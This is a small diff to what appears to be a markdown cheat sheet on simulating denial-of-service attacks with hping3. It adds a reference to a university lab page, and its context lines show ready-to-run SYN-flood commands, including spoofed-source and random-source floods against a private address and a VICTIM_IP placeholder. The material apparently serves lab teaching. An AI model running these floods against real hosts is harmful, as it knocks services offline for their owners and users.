@@ -47,3 +47,6 @@ hping3 -V -c 1000 -d 100 -S -p 21 -s 80 -k -a 192.168.1.110 192.168.1.110
 ```
 hping3 -V -c 1000000 -d 120 -S -p 445 -s 445 --flood --rand-source VICTIM_IP
 ```
+
+## References
+- http://docente.ifrn.edu.br/josemacedo/disciplinas/2019/2019.1/praticas-de-laboratorio/03-simulando-ataques-dos-com-hping
